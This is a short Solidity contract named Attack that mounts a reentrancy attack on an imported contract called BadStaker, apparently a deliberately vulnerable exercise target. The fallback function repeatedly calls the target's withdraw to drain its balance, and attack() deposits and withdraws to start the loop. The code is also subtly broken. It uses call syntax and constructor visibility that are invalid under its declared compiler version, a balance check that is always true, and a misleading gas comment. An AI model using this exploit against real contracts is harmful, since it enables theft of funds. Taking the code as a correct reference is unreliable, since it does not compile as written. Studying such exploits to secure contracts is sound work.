// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;
import "./BadStaker.sol";

contract Attack{
    BadStaker public stakerInstance;

    constructor(address payable _stakerInstance) public{
        stakerInstance = BadStaker(_stakerInstance);
    }

    // this function will be called when not existing function is called, this function can't do with over 2300gas fee
    fallback() external payable{
        if(address(stakerInstance).balance >= 0){
            stakerInstance.withdraw(address(stakerInstance).balance);
        }
    }

    function attack(address payable _stakerInstance) public payable {
        uint256 amount = msg.value;
        stakerInstance.deposit.value(amount)();
        stakerInstance.withdraw(amount);
    }
}